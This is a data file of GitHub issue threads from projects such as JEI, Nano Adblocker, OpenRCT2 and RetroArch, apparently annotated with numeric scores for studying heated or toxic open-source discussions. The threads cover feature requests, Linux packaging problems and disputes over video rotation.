JustEnoughItems/mezz/1153,0.281483245,mezz,JustEnoughItems,[Enhancement] KeyBind to Hide All JEI,2032,30,14,0.464285714,0,"Not 100% sure but, after looking for 6 minuets in keybinds and options in jei I can't find a hide jei all option only the left panel. The point of this would be your tired of it for a bit and want to remove it or you don't want others to think your cheating in survival. Default keybind""o"" Also keep the boolean public so modders can decide where and when to hide it  JEI doesn't have a left panel. The item list can be hidden with CTRL + O  Ever heard of encapsulation)?  um key bind to hid the right panel control + o hides the left panel when addons are in  Then you should request those addons add their own keybind. They have absolutely nothing to do with JEI.  No because the other addons can't hide jei jei needs to get hidden with a keybind or under specified conditions via boolean visible not the addon pannel  JEI does not draw on the left side of the screen. JEI's keybind for hiding itself (the right side ingredient list) is Control+O by default, and configurable in the controls menu. If it is not working, or the behavior is changed, it's because some other mod is messing it up. Please find out which and report to them.  Did You read I said right side  I am close to banning you from my issue tracker. Please respond in a less pedantic way.  Keybind o to hide all JEI not just the left pannel that mods add. Your currnet setup in your JEI keybinds that I saw said to hide something and that something with addon was left pannel by itself it did nothing without any addons.  FUCK YOU YOU DON'T FUCKING READ SHIT IT SAYS RIGHT SIDE THE RIGHT JEI PANNEL NOT PATHETIC  In your original post it says Pedantic does not mean pathetic, look it up. I think you are the one who isn't reading carefully. Goodbye.  ok well actually this is a seperate issue control + 0 did hide it but, with the addon it wasn't weird maybe if you just told me it does hide the pannel with control + o to the right I wouldn't have been pissed sorry   The very angry comment was deleted but I'm not putting up with that, I've blocked him now. / ",7,2,49,0.142857143,0.321428571,125,1,y,
NanoCore/NanoAdblocker/87,0.146598948,NanoAdblocker,NanoCore,Disable specific filter on single site,6137,66,18,0,1,"i think this is the best enhancement  I don't see a reasonable implementation of this...  Filter lists can limit the amount of domains each rule apply to with many ways. If you need to set a different set of filter lists for each domain, then chances are the filter lists you are using are kind of broken.  And there isn't a reasonable way to swap filter lists sets internally.  it depends on how the internal data structure of the core looks like if the rules still have a reference to the list they came from then it shouldnt be too hard to just ignore them on a specific website just like you can switch off blocking completely for a site. if the internal structure is just a huge merged and optimized set of rules, which i assume is the case, then you would have to rebuild that internal structure once you click on that button or when you later load that site again or if you leave and all filterlists should be on again. if the performance hit is too great then there are two ways to deal with it. generate an internal structure for each new combination of active lists and keep it for later or use the normal datastructure when all lists are on and if one or more are disabled then execute each least sequentially. this could behave differently than a combined list, like you mentioned, so maybe some sort of hybrid would be needed. so, yeah, not an easy task if my assumptions about the project are correct. but it would still be a very worthwhile feature that you shouldn't give up that easily. maybe gorhills rework of the engine makes this easier to implement.  Whitelist just completely disables filtering, that's different than disable one specific filter list for that domain. Currently, if I understood the code right, each filter list will be compiled separately and stored, all selected filters are merged together. The merging process need to be done every time a filter list is turned on or off. There are also snapshots of internal states for fast startup. I can't think of a single use case. Did you spelled ""harder"" wrong?  i dont think he wanted whitelisting. if you have experimental or generic filterlists that work well most of the time but occasionally break sites then you want to quickly disable the list for this specific website but not in general and you do not want to go through the dashboard every single time you visit that site again. you should also contact the maintainer but it will take time until it is fixed. you could even just move along and after a few weeks you look up your dynamic rules and post a bug report with all the problems you collected over time but were too lazy to report at that moment. well, unlikely but at least possible  Just override the rule with your custom filters, that's what it's for.  while still a lot more work than 2 clicks i could do this. most people wont. blocking something with the element hider is something many would be capable but figuring out an exception rule is too much for casual users who just set it up, tweak a few options and select and install a few lists and then call it a day. not everyone is going to read the wiki about the filter syntax and then debug every page that causes problems. giving them a better option than having to switch off Nano Blocker entirely or uninstalling a list just because of one or two false positives would really add some usability benefit.  If you are a casual user, chances are you won't be adding filter lists other than those that come with Nano Adblocker.  If you are a casual user, chances are you won't be able to know which filter list you have is causing the problem.  If you can find out which filter list is causing the problem you will be able to set up the exception filter. If you absolutely need to toggle between two sets of filters, use browser profile. This is non-trivial and only has theoretical use case, I'll decline this feature for now.  What I will do is to add a button in Logger that turns off a rule.  mayby quick access to off specific rule on single site example.   If you find yourself have to toggle a filter list frequently, then you probably need to figure out what exactly is wrong.  you do not only want this when something is wrong. maybe you have a list that implements a night mode and you personally do not want it on a specific site or a floating header that you want for some special use case or you want to allow ads for a site but not tracking and annoyances.... besides that it is great for trouble shooting. you turn off lists as long as the site works again. then you immediately know who to send a bug report to.  If you need a night mode or any other mode, use browser profile.  For trouble shooting, use the Logger.  make a browser profile for every website? thats not practical. you do not need that many tries if you always the disable half of the remaining ones. ~log2(n) turns.  an ordinary user will not be able to and will not want to look into the logger.  like this?   You do realize there are over 100 000 rules enabled by default right?  on single site?  O  There are well over 10 000 rules affecting every single site. A lot of generic rules in EasyList.  hmm.. you can segregate this rules to category and hide  gorhill has his decisions, I have mine. If you disagree with both, then you have to look for another fork, or fork yourself, then you don't need to convince me to implement the feature. Maybe we have a different definition of ""casual user"", but I don't think any of the proposed feature is useful. If you need a per-site profile, then chances are you are not a casual user, and should use a custom filter list for that.  Listing active rules on the popup will definitely not be easier to use than the Logger, and casual users cannot understand what they are seeing. If Logger is too complex for them, putting a smaller Logger in the popup will just be worse. I'm not sure what that means, you are welcomed to teach me how to code, but do so in Pull Requests.  I'm locking this as it's not getting anywhere, if you truly believe this feature is necessary, please Pull Request, I can test out the result and maybe I will change my mind. ",31,7,127,0,0,53,5,y,
OpenRCT2/OpenRCT2/7186,0.037171184,OpenRCT2,OpenRCT2,OpenRCT is not working on Debian Buster because of libpng12 (and probably other distros),5785,55,44,0.458333333,12," OS [Debian Buster] Version [0.1.1] Commit/Build [4601265] ./openrct2 error while loading shared libraries libpng12.so.0 cannot open shared object file No such file or directory  [x] Reproducible in RCT2 (vanilla)? [ ] Multiplayer?  Steps to reproduce  Trying to run it praise  Notes 6697 is known to me and a clutch and not a solution Please, Please use AppImage to be less of an headache for 80 of the Linux Community  be linking to  and calling @friend for help  There is already  can you please detail what are the differences between the three available formats? Getting it packaged as snap required just a few minutes and a handful of lines in  (which I don't think I have handy right now) and I worked with upstream developers to improve Arch (my distro of choice) support, which was the major roadblock when the issue was filed. Please also take a look at  /  simply not true. Your  may be unable to do that, which is a deficiency of your package manager, but there is nothing stopping users from installing .  Ubuntu AND Debian (stable) already dropped support for that obsolete version of libPNG solution provide this obsolete version with the software (with appimage, flatpack, snap) or upgrade to the new version that offically replaces it. Again, there is a difference between a ""kludge"" and a ""solution""  How about you approach us less aggressively? Do you honestly expect us to help you if you're talking to us like that? In any case, we still compile against libpng12 because of Ubuntu 16.04. That will most likely change when Ubuntu 18.04 comes out.  i dont see a reason to wait that long, ubuntu 17.10 is out already and dropped support while libpng16 is supported by ubuntu16.04 and up and also Debian  and sorry for that ""aggressiveness"", i have mental issues and lose myself quickly  Ok, thanks. ubuntu 17.10 is out already and dropped support while libpng16 is supported by ubuntu16.04 and up and also Debian Our CIs run on 16.04 and non-LTS images are not available. Furthermore, while libpng16 and libpng16-dev are available, attempting to install them means removing libfontconfig1-dev and libfreetype6-dev, both of which we need.  what are the consequences of them being disabled?  Said Debian user.  libpng 1.6 was first released 2013-02-14 and it only took 4 years for debian to notice  and  don't see what's the sudden rush all about. You're welcome to compile openrct2 on your system and we will properly use libpng 1.6. We will gladly accept any help to improve the situation, which you so kindly offered, but in the meantime I would suggest you tone down your demands a bit, as you come through as overly aggressive. See  for rough idea of how the upgrade of relevant CI jobs to 18.04 is meant to look like (TL;DR switch as soon as it's out)  yes, want to keep my system clean of kludges, i was forbidden to tinker with it unnecessary  Well, we can't compile without libfontconfig1-dev and libfreetype6-dev, unless we disable TTF rendering. But since normal builds have TTF rendering on, this is not a good idea - it means bugs can easily go unnoticed. Anyway, openrct2 can be compiled against libpng16, in case you compile stuff yourself.  i hate compiling, i am not a dev (yet), just an annoyed user that wants to play this game  Well, we have given you a number of workarounds. It's up to you if you want to use them or not.  then i would probably try the Android version instead  congrats, the android version is playable,  i really hope you make the Linux version easy to use soon  @friend you can try using the packages from launchpad  @friend i use Debian, i wrote that in the issue  That's completely not true.  i read that on the Debian Wiki, and i won't corrupt my system because some stranger told me to do... i am an end-user, i want a properly packaged version of this game to be able to play it, like everyone else does that successfully but OpenRCT2  The obvious solution for you @friend is to run vanilla under wine or a windows VM until OpenRCT2 can be updated since you seem paranoid of contamination. (it's highly unlikely that you would break something by compiling this yourself. And that's why we have backups.) By the way, the second portion of your last post seems cut off.  i use wine for it already (which is sad)  Ultimately it's up to you to use the builds we provide.  @friend  how that??? the builds that youn provide dont work  This discussion is getting pointless. You said yourself you refuse to use the builds we provide  the ppa builds are made for Ubuntu  Why did you report the bug in the first place then?  because your build does not work on my os  This is getting ridiculous. So you try a build done on Ubuntu and file an issue but refuse to try use another build on the grounds ""it is not your OS"" and keep on whining how you refuse to apply the fix‚Ä¶ so why did you file the issue in the first place? There are fallacies in your arguments. As I said earlier  @friend we do not support Debian, for Linux distros it is up to the community to provide packages through the package manager of the distro. We do not have the manpower to provide specific builds / maintenance for every distro as they are far too many and they all have their subtle differences. You can either use a supported OS such as Windows or Ubuntu 16.04 or ask someone in the Debian community to provide a package for OpenRCT2.  Look, we have suggested several options. You have dismissed most of them. That's not helping. And while I'm not completely happy how @friend handled some stuff here, you're not conversing in a very pleasant way either. In any case, this has gone out of hand, so I'll have to lock the conversation.   migrated our Ubuntu docker images from Ubuntu 16.04 to Ubuntu 18.04, our future builds will be using that as a base ",18,10,182,0.166666667,0.333333333,133,11,y,
OpenRCT2/OpenRCT2/7365,0.14349963,OpenRCT2,OpenRCT2,Cannot Switch Ride Building Screen from Group By Track Types to Group By Rides,4006,44,21,0.285714286,1," **OS** Windows X Sixty Four Bit (laptop) **Commit/Build** AA7FB35    Good evening. The issue I am experiencing concerns a preference pertaining to the sortition of all available attractions and rides. By default, there are entries for each ride as written in RCT2. The Vintage Cars get one slot, the Car Ride gets another, and so on, despite sharing the same track. There is a secondary option, which combines the rides and groups them by track type. This forces the Vintage Cars and Car Ride onto one slot, the Steeplechase and Soapbox Derby rides into one slot, and so on.   [ ] Reproducible in RCT2 (vanilla)? [ ] Specific to multiplayer?  Steps to reproduce     Dump file  Screenshots / Video  Save game   The old sorting made little sense the racing cars, sportscars and trucks were put together, but the cheshire cats and vintage cars were not. In addition, the old approach also restricted access to several track pieces and made it impossible to switch vehicles afterwards. I'm afraid we're not going to revert this decision. The RCT2 mechanism was disliked by a lot of people and supporting both means more complexity.  Both were supported for a long, LONG time. Continuing that support would require no significant effort. Forcing your will on others who prefer the other system is wrong. I am not asking to change it back or make the correct version the default. I just want to be allowed to choose. I deserve a choice. Playing the game with tracks crushed together is very difficult for me, because I can't remember what I've selected or where. Not everyone plays the way you do. I deserve a choice, and I am sure the others who use the default system would be mad as well. Railroading your personal preferences on others is a mistake.  This mechanism was liked by a lot of people, too, given it was the way we played it for about twenty years! You can maintain choice, and the choice was already implemented! It's a matter of not wanting to.  You can always just play with an older version if it's that much trouble, can't you?  I've seen them implementing their own object files and stuff lately and so I would guess that maybe since they're doing that it's changing how the codebase works and it would take extra effort to support both methods going forward.  You already made your choice to use OpenRCT2 instead of vanilla RCT2. You've gotten used to the way vanilla RCT2 handles things, OpenRCT2 changed it (and not just because it can be changed), and then you complain that it has. You can always use an older build from before, or play vanilla instead. By all means, feel free to fork this project and revert the commit that changed the behaviour, then play with your own build. So there are plenty of choices you can make.  @friend That, combined with the fact that the current system had matured enough, is indeed the reason we removed it. We created a new object format and we weren't going to support all of RCT2's cruft. @friend Oh, of course, you know this better than someone who actually maintains the software. If it would require no significant effort, then please do what @friend suggested and maintain your own fork with this feature put back in. Prove that I have no idea what I'm talking about if it's this easy. Hell, if you know better than we do, why don't you just go ahead and fix some of the bugs we have a hard time fixing? Why do you deserve a choice? How much did you pay for OpenRCT2? How much do I get paid for working on it? You have an awfully big mouth for someone who got all of this for free, especially considering I am investing a lot of spare time into this without any financial gain. You have no reason to demand we put this feature back, and especially not with the tone you're using. You don't have to like our decisions, you can discuss it with us, but the very least you could do is to treat us normally. I wouldn't tolerate this if this were a paid game and I got a salary from it, so I'm certainly not going to tolerate in these circumstances. ",16,4,122,0.285714286,0.428571429,119,9,y,
RetroArch/libretro/8551,0.43871816,libretro,RetroArch,Width and height are switched when a vertically-oriented game is loaded ,29134,255,155,0.5,6,"Description With vertically oriented games, Retroarch switches the emulator-provided width and height. For example, if the width/height is supposed to be 320x240, RA will switch this to 240x320. This only occurs with vertically oriented games. I tested this in both MAME and FBA using the Windows 64 bit version of RA. Expected behavior The game to be displayed using the correct resolution (width/height). Actual behavior The height and width is switched when a vertically oriented game is loaded. Steps to reproduce the bug  load any vertically oriented game in either FBA or MAME using Windows 64 bit version of RA. under video settings, enable integer scale.  set ""custom aspect ratio width/height"" to 1x. look at ""custom aspect ratio width/height"" to see that it says 240 for width and 320 for height. This is the reverse of what it should be.   Bisect Results I first noticed this a few days ago. Version/Commit You can find this information under Information/System Information  RetroArch 1.7.6 Git version 9750719074  Environment information  OS Windows 10  Compiler NA     some arcades have the monitor rotated 90 degrees. The  can the emulator can either rotate the image to the displays orientation or display it as intended and you rotated your display 90 degrees  I understand that, but the emulator-provided resolution should not be changed from the correct resolution, regardless of orientation. If the game is 320x240 it should be output as 320x240, not 240x320. The user can flip it or rotate it or resize it or whatever, but the output resolution from the emulator should remain the same (eg, 320x240 should be output as 320x240 before the user does stuff to it). Otherwise you get scaling artifacts unless you just happen to adjust the y axis to a multiple of both 240 and 320 (eg, 960). And if you‚Äôre playing a game that uses a weird resolution like 19XX (384x240), then it causes big problems with overscan or underscan when using integer scaling. As of right now, video aspect ratio for vertical games must be configured manually (custom ratio width/height, non-integer) along with custom ratio x/y position, because the resolution/ratio for vertical games isn‚Äôt being detected correctly.  the thing is the topic say the width and height are switched they simply arent it just a rotated monitor. It draws the image on the monitor as 43 then you flip the monitor physically this changes it to 34 on real hardware as far as the hardware is concerned its a normal 43 device but your rendering the image 90 degrees rotated. In mame2003 or plus just use tate mode this stop the rotation and you need to flip your monitor like a real one. look at sf2 this is on a 43 screen look at the resolution of the game it use crt timing when rendering to look the way it does in a crt if you used the literal resolution for sf2 the gfx would be overly stretched.  it looks like your talking about capcom games watch this to understand whats going on and it is indeed 43  I‚Äôm not referring exclusively to capcom games. You can see this behavior in the example screenshots I posted above, which are from Donpachi. I understand very well that certain games are meant to be displayed vertically. This doesn‚Äôt change anything that I‚Äôve said. With a vertically-oriented 320x240 game, width should say 320 and height should say 240, and the displayed image should be sideways. On a 43 CRT monitor the image would be 320x240 and sideways. You then rotate the monitor 90 degrees. This doesn‚Äôt change the image to 240x320. It is still 320x240 but now it is rotated 90 degrees so it is no longer sideways. Altering the internal resolution of the game is incorrect, and will always result in scaling artifacts unless you happen to use a resolution that is a multiple of both 320 and 240.  If you display the arcade pcb to a CRT monitor in normal orientation it will be a 320x240 image that is sideways. You rotate the CRT 90 degrees. The resolution of the game remains unchanged.  yes resolution of you display remains unchanged. I dont have a crt to test whats going on there I would assume you should be using core provided information and tate mode on for mame2003 and plus dont know if the others support tate mode  You just aren‚Äôt getting what I‚Äôm saying. I‚Äôm going to have to post some screenshots later to help illustrate what‚Äôs going on currently and what should be going on instead.  can you make them screenshot in mame2003 and 2003+ with tate mode on so i can see what going on make sure your using core provided for aspect ratio as well in them screenshots will help a lot in seeing whats going on  First of all, just look at the first two screenshots I posted above. See where it says ""custom aspect ratio width"" and ""custom aspect ratio height""  Both of these screenshots were taken with video rotation disabled. Width/height should be the reverse of what is shown in the above screenshots.  Here is what it SHOULD look like with video rotation disabled. This is what is NOT happening, currently. I created this in GIMP by manually switching the height/width in GIMP.   Here is what currently happens. Both of these are incorrect. video rotation disabled  video rotation enabled   Next, here are some tests conducted by HunterK. See how video height/width are switched from what it is in my screenshots in the very first post? That's what it should be.     what emulator is this from here is screenshots from with ?  Next, I made this shot by manually resizing the resolution to 1600x1200, and used a scanlines shader. Notice how the scanlines and mask are perfectly scaled with no scaling artifacts present. This could only be the case if the game's resolution is indeed 320x240. With the currently reported resolution of 240x320, you get scaling artifacts.   I already said what emulator is being used in my initial post. The behavior is present in both MAME and FBA in the Windows 64 bit version of RA. As you can see in the tests conducted by HunterK, this behavior is not present in the Linux version of RA.  this is mame2003 with tate mode on and off using core provided aspect ratio I cant speak for the other emulators    ....How is this helpful?  have you even tried running mame2003 with these settings it what it shoud do tate mode skips the rotating and renders like its should.  How are we supposed to know what the core reported width and height are from the screenshots you just posted? Again, the issue is that the emulator reported height and width are not correct.  Tate mode ON solves the issue in MAME 2003. Tate mode off  Tate mode on   i think mame current has rotation options in the tab menu dont know if they will work as expected though  The problem is, tate mode ON in MAME 2003 should be the default for all emulators including FBA. This is what the image looks like when you connect the actual hardware to a CRT that isn't rotated. There shouldn't be any automatic switching for vertical-oriented games. Switching height/width (Tate mode off) should be something that the user has to select because it's altering the original output of the emulated hardware. Anything done to alter the original output of the emulated hardware in this way should be something that the user has to manually select. Still no idea how HunterK was able to get the image to to display correctly using FBA, and I'm still unable to get the other version of MAME to display the image correctly.  sure that can be true im sure most people dont have there displays rotated unless they have a barcade of some sort setup for vertical games only. Its  a personal opinion but feel free to post an issue on it is easy enough to change the defaults through issues in the emulators in question. I dont really feel strongly about this its one for the people in charge of the repos it switchable in mame2003 and plus anyway in the options so the default wont really matter it can be changed to suit your display  I'm not just being pedantic, here. The width/height being switched isn't helpful and causes numerous potential issues. With the current behavior of height/width being automatically switched with vertical games, you still have to rotate the image if you want correct aspect ratio and orientation or to avoid a huge amount of letterboxing, and with height/width being switched like this, it results in scaling artifacts unless you happen to choose a resolution that is a multiple of both 320 and 240. Furthermore, there is still no way that I know of to get any emulator besides MAME 2003 to work correctly. The current rationale of ""people don't want to rotate their displays"" just isn't sufficient to justify this.  first of all i completely agree with you all options should be clear to change and i feel fba does cover this option well its just you have to restart for it to take effect/ ill need to look into mame current at a later time. I will tell you how to to fix fba got quick menu options turn vertical mode on and restart the emulator it should work as expected.  In FBA, enabling vertical mode in the quick menu options and restarting the emulator does not fix the problem. I'm still getting this   Another problem related to this is the sheer number of knobs and dials related to video rotation. There are options related to video rotation in all of these places main menu -&gt;quick menu -&gt; options settings -&gt; video settings -&gt; core If I'm an average user, how am I supposed to know what to do with all of this? Even as an experienced user, this is quite confusing.  SUCCESS. Actually, in FBA I have to turn vertical mode OFF under quick menu -&gt; options.  So, yes, there is a lot going on here. Each of the cores seems to be handling this in a different way and there are far too many knobs and dials related to this. Disabling vertical mode makes it work in FBA, while enabling tate mode in MAME 2003 makes it work there... how does that make any sense?! As things currently stand, the options for this are an incoherent mess. Even you thought that enabling vertical mode would be the same as enabling tate mode, which makes sense, intuitively. There just seems to be no rhyme or reason to the way these settings currently work.  I'm still getting the same problem in FBA 2012. There is no option in quick menu -&gt; options for vertical mode. Under settings -&gt; core there is an option for ""enable rotation."" I'm getting the same results with this turned either ON or OFF. settings -&gt; core -&gt; allow rotation ON  settings -&gt; core -&gt; allow rotation OFF   as far as I can tell, the problem is the frontend based rotation not taking into account the aspect ratio change. I don't think we need so many knobs in the cores to do this, it should be one option in the frontend and that's all. I'm not even sure why there is a ROTATION ENV callback in the API  there is a reason for it to be there clearly this isint a front end issue. It cant guess if you have rotated you monitor 90 degrees physically you need to deal with this as a core option if that is the case.  Agree w/fr500. In my opinion, a vertically-oriented game should look like this by default  The user can then rotate the image using the advanced user option under settings -&gt; video -&gt; rotation You could also add an option under video settings (""automatically rotate vertical games 90 degrees"" or something) to automatically set settings -&gt; video -&gt; rotation -&gt; 90 degrees whenever a vertical oriented game is detected. But, I'm getting ahead of myself.  You're missing the larger issue which is that the emulator isn't always using the correct resolution. The resolution/aspect ratio should remain unchanged regardless of rotation- see above. A vertical game that is 320x240 should be output as 320x240. The frontend option for video rotation is more than sufficient and solves the problems related to the way things are currently handled, which are, to wit  it's incorrect according to what the original hardware does it's counter-intuitive  it results in scaling artifacts with integer scaling   and how is the front end supposed to guess that this particular arcade is rotated or not mame2003 covers this i dont see how you can get the front end to be psychic  I'm saying that the front end options are sufficient and that the cores are currently doing something wrong/there's too much going on with the cores. Just make the cores output the original resolution, unaltered, and let the user use the frontend options for rotation and aspect ratio. That would solve the problem(s). In standalone FBA, you get this by default, which is as it should be  With ""Video -&gt; rotate vertically aligned games -&gt; enabled"" you get this, which is again as it should be   ok with you so far you failing to mention the users monitors physical orientation in all this  I don't see why the monitor orientation is relevant to what resolution the core is outputting. Altering the height/width of the resolution so that the image is correctly oriented on a non-rotated monitor is altering the output resolution, and thus incorrect. The core should just output the unaltered resolution. Altering the resolution, aspect ratio or video rotation is all stuff that should happen on the frontend or through a user option that has to be selected.  Also, as we can see, there's just a lot of weird stuff going on. TATE mode ON in MAME results in the same behavior as vertical mode OFF in FBA, and FBA 2012 won't display a correct image no matter what settings are applied, and I haven't even tested all the emulators yet. I understand the lack of standardization when it comes to core options, but this just seems somewhat ridiculous.  im trying to understand where you are hitting this from the cores arent scaling the resolution RA scaless the resolution to your display.  To what are you referring with this statement?  If the front end can't detect whether a game is vertical or not, then it's the cores that are automatically switching the height/width for vertical games.  yes they do people that dont rotate there monitors dont want to play there vertical games sideways or rotate there monitor by default.  Tate mode wont rotated vertical games at all on mame2003 that what you requested.  This whole discussion is pointless. There is not need to guess anything, this is software development, there is an API, an implementation, and a frontend. There is an API for this  the players are  core api frontend  Who knows the content needs rotation? The core does. The environment callback is a set, which means it's telling the frontend to ""do something"" So what should happen could go two ways a. The core tells the frontend ""hey video is rotated, adjust aspect ratio from what I reported accordingly"" b. The core tells the frontend ""hey this content requires rotation, do whatever you need to do so it works properly"" That's all. This is a frontend problem, but before anything can be do about it what we need is clarification from the API side so we can adjust both the frontend and the cores to do whatever needs to be done. That's all.  there is no front end issue some arcades have different rotations not just 90 degrees. The core needs to work this out the user will need to be more specific from what he says he wants vertical games to display like this by default  which is perfectly valid if you have a rotated monitor.  this is how it displays when you dont have a rotated monitor the user seems to think this is wrong   Ok, you win, have fun arguing forever instead of proposing a solution.  Ok you have a 43 monitor it draws as 43 like the fist picture you rotate it the monitor in the arcade 90 degrees what aspect ratio is it now for us to display on out normal monitor sitting on the tv stand? ill leave you two to it  I don't understand all of this, but it sounds very reasonable. Yes, it does seem grant2258 and I have been going in circles with this. I think I've provided enough info on the problem as it currently stands to work towards a solution, but since I'm not a programmer, I've probably done all I can by this point.  i agree with that  @friend  im sure @friend has some idea looking forward to seeing what he is going to do since he thinks there is an issue and what exactly is wrong as i cant see any issue at all with mame2003 or fba on libretro it both have the ability rotate or not rotate vertical games. It does it the same way as mainline fba and mame. So i wll digress im at a bit of a loss what you two seem to think the issue is is you want to maintain a 43 ratio you need to rotate the Monitor or physically force the aspect ratio to 43 when rotating and put up with the streched gfx  The issue is that the behavior isn't consistent across cores and it's confusing as hell what is actually going on. There is the separate issue of what the default behavior should be for vertical games, which you seem to be caught up on. As of right now, MAME and FBA do the exact opposite thing with video_allow_rotate = true/false. And that's just two cores. Who knows what's going on with other cores; I haven't even had a chance to test them yet. TATE on and video_allow_rotate = true in MAME 2003 produces the same results as vertical mode on and video_allow_rotate = false in FBA. How does this make any sense? posting this for reference, read from this post down.   automatically switching the width/height for vertical oriented games is altering the output resolution, which is incorrect. The emulator should just output the resolution completely unaltered. Altering what is output by the emulator should always be done by the frontend, or through an option that the user has to manually select, but maybe that's just my opinion. The default should just be whatever the emulator spits out before you start doing stuff to it.  rotating the game is something that can be easily handled in the frontend without all of the confusion that currently exists  2 is something that can even be done automatically if desired by the user, through the frontend as explained by fr500.  the current method of automatically switching the height/width with vertical games will always result in scaling artifacts no matter what you set the aspect ratio to (unless it's a multiple of both 240 and 320). How can this be considered correct?  the current method of automatically switching the height/width of vertical games isn't even making things easier for the user in all cases, because video_allow_rotate = true/false isn't doing the same thing in all cores. The current method is just adding more confusion.   My brain is tired. Hopefully the thread I linked to above sheds some additional light on the problem.  IMO Standalone FBA does things right. See  default it's sideways and 320x240, and there's a clearly labeled and easily accessed option to rotate video under the video menu. There should be a way to make RA work the same with all cores using one of the methods @friend described (it may need either a or b depending on what the core is doing). You could then add an easily accessed user option to automatically rotate vertical games. Or we could just endlessly debate what the default behavior should be when launching RA for the first time.  Ok here is the screenshots with you information the core geometry is reporting the right resolution  Ra  I'm trying to figure out the point you're trying to make. If you're still arguing over what the default behavior should be when launching RA for the first time, I'm done with that conversation.  you rotate 320 x 240  image 90 degrees is becomes 240 x 320 thats as simple as you can describe it  Who is disputing that? What is the point of this?   Yes, and how do you think what you just said contradicts this statement? I think there is a language barrier here that is preventing meaningful discussion.  that was you that it in your first post   your rotate an images the 90 degrees THE x /y swap  Furthermore, the conversation has progressed quite a bit beyond the initial post. If you had been keeping up with the conversation you'd realize that the real issue is a lack of consistency between cores when it comes to the options related to video rotation. I am 100% done debating with you what the default behavior related to video rotation should be. It doesn't matter what the default behavior is. There are pros and cons to having rotation on or off by default and ultimately it's just an arbitrary decision that has to be made. What matters now is getting consistent behavior across cores and removing unnecessary knobs/dials that just lead to more confusion. @friend already outlined the solution and what he needs to implement it.  I literally can't even tell what you're trying to say, here. I'm sorry, I really don't want to offend but the language barrier is just too much to deal with. I feel like you just consistently fail to understand the point being made and respond with irrelevant information most of the time and now I'm just wasting a lot of time trying to clarify things to you. I appreciate that you're trying to help, but we haven't been getting anywhere for a while.  i literally cant even figure your problem out the games will show sideways if they arent rotated. mame fba and lr cores do this. So i guess i leave it at this not wasting more time on you back tracking it not a good default leaving vertical games sideways. Something you claimed fba done  did you even bother following the steps I listed to reproduce the bug? Or bother looking at the discussion at the libretro forums? There is most definitely something weird currently going on with video rotation and height/width being switched. It's not a problem present in all cores. Rotation behavior is not consistent across cores, for the nth time. That's probably the main problem. FFS, the screenshots I provided prove it! Facepalm. Here, to make things even clearer    you rotated the image  what do you expect to happen? you screen shots prove nothing accept the video is rotated and not rotated.  fba and mame2003 create the same images  That's exactly what I expect to happen. Do you see that you're just not following what I'm saying very well?  No they don't, and I've provided numerous examples demonstrating this.  I guess you dont get it when you rotate the video it becomes 34 proof is in the screen shot from fba rotated. it 240 x 230 as well not wasting any more time repeating this   Read this thread, from this post down to the end. Others clearly recognize that there is an issue.   just go away. You aren't getting it and I've reached the limit of my patience with this.  is fba wrong as well. Ive lost my patience with this as well.  From the thread I just linked to, above So, yeah. It's not that you're wrong, it's just that you never quite understood what the problem was in the first place. Thankfully, the issue with FBA was recognized and corrected by BarbuDreadMon.  sending the wrong geometry form the core to fix it i would say thats out of spec and a patch. im sure mark will patch mame2003 and + up to send wrong info so it works in mame2003 and plus. Its trivial to do never the less i wont be changing is as its out of spec to whats really happening. no matter what your little numbers say the resolution is 240 x 320 when rotated )  i can explain the reasoning behind TATE mode core option in mame2003 the emulator sends two bits of information to the retroarch API; the games width and height, and how much it should be rotated so, for a typical arcade game, that would be width 320 height 240 rotation 0 (none) now, for a typical arcade vertical game (which were rendered sideways, and then the CRT was rotated when put in the cabinet), that information would be be width 240 height 320 rotation 1/3 (90/270 degrees) the issue is, retroarch uses the sent height and width regardless of whether it has been rotated or not. so, the emulator has to send the width and height of the game on the presumption that the rotation has happened. so, if you set  you will get an unwanted result ‚ô†video_allow_rotate = truevideo_allow_rotate = falsevideo_allow_rotate = falsevideo_allow_rotate = false`)  (PS, screenshots from behaviour of mame2003 for a year or so ago, and retroarch 1.3.6 - this is what i originally designed TATE mode on - someone else rewrote TATE mode in 2003 so it instead does the rotations within the core itself - personally i think it should all be handled in the front end) so hopefully that shows the issue that TATE mode was trying to solve. IMO there's some better solutions 1) the API lets the core find out what video_allow_rotate is set to. that way, it can send the appropriate height/width for the situation. 2) rotation of 1 (90) or 3 (270deg) also flips the height/width. this would be my preference. i haven't really thought about the ramifications of these! )  there is also some interplay with aspect_ratio that I've forgotten the details about.  the front end is still doing the rotating in mame2003 the fix is trivial your just dont swap change the x/y (like you should be doing in the core geometry).    rotate anything manually the geometory x/y in the menu doesnt change.  No one ever disputed that the correct resolution is 240x320 when rotated. What's being disputed is whether or not all the cores are reporting the correct resolution when the image is rotated. You really are failing to grasp what's going on, here. Numerous people have since recognized the issue I'm describing and the issue in FBA was both recognized and fixed. The fact that you're holding firm on this even in spite of this indicates either a willful stubbornness on your part to admit that you're wrong, or just a complete misunderstanding on your part. There are numerous ambiguities and equivocations occurring in this conversation which make it very difficult to have a meaningful discussion with you. In fact, on more than one occasion you seem to think that I'm arguing for the exact opposite of the point I'm trying to make. The question of what the default rotation behavior should be for vertical games is almost trivial. It literally only matters the first time RA is launched, after which the user can set the behavior in the frontend. The MAIN issue is getting consistent behavior across all cores, regardless of what the default behavior should be. Now, if we're discussing the SEPARATE issue of what the default behavior should be or what is technically ""correct,"" I've already said what I'm going to say about that. You can either respond directly to the points I've made or continue ignoring them, either one is fine by me. Both standalone FBA and now also the FBA core do exactly what that they should be doing by enabling rotation in the core options and enabling vertical mode in the quick menu core options, you get the correct image, which looks like this   @friend clearly in not debating with you and your screenshots anymore. you clearly dont understand geometry when a rotate happens. Im not wasting more time on it with you. No offence i posted a fix details for mame2003 and plus to send this bad geometry clearly you dont understand this at a level beyond screenshots.  As for tate mode in mame2003 and  plus is a ccw 90 degree rotate (it was renamed to what it is now from that) so if the arcade is 90 or 270 it will rotate the same way if the user has there screen rotated in a barcade/ servo/ stand setup . If you want a no rotate option youll need to post a github issue to get it added  why is this still going on. The problem was AR not being updated when using some rotation option (there are at least 3 ways to achieve rotation in RA) @friend I just noticed you are setting aspect ratio to 1. Why? aspect ratio should be core provided.  to sum it up its to do with core rotating an image with ra the cores info updates the rotated geom. RA doesnt like it or update geometry when you do a manual rotate itself.  So you have to return the original orientation even when you rotate through RA with the core.  all mame cores will need updates or ra should report rotated geometry.  @friend You are completely hopeless. Several other devs agreed that there‚Äôs an issue, FBA dev already agreed that there is an issue and fixed it In FBA. To deny that there is an issue at this point is pretty much insane. I‚Äôm done talking to you.  @friend, yeah I don‚Äôt know why 